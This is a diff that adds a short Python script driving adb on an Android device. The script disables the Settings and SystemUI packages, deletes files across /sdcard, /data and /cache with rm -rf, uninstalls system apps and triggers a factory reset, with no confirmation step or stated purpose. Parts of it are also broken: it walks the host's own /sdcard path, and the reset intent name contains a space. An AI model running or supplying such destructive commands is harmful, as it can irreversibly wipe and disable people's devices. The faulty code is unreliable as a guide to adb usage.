@@ -1,0 +1,36 @@
+import os
+import time
+import random
+print("Disabling security features...")
+os.system("adb shell pm disable com.android.settings")
+os.system("adb shell pm disable com.android.systemui")
+time.sleep(2)
+print("Wiping internal storage...")
+for root, dirs, files in os.walk("/sdcard"):
+    for file in files:
+        os.system(f"adb shell rm -rf {root}/{file}")
+        print(f"Deleted {root}/{file}")
+time.sleep(5)
+print("Wiping external storage...")
+os.system("adb shell umount /mnt/sdcard")
+os.system("adb shell rm -rf /mnt/sdcard/*")
+time.sleep(3)
+print("Deleting system apps...")
+system_apps = [
+    "com.android.browser",
+    "com.android.calendar",
+    "com.android.contacts",
+    # ... add more apps here ...
+]
+for app in system_apps:
+    os.system(f"adb shell pm uninstall {app}")
+    print(f"Deleted {app}")
+time.sleep(10)
+print("Wiping system data...")
+os.system("adb shell rm -rf /data/*")
+os.system("adb shell rm -rf /cache/*")
+time.sleep(5)
+print("Performing factory reset...")
+os.system("adb shell am broadcast -a android.intent.action.MASTER CLEAR")
+time.sleep(10)
+print("DEVICE WIPE COMPLETE.")
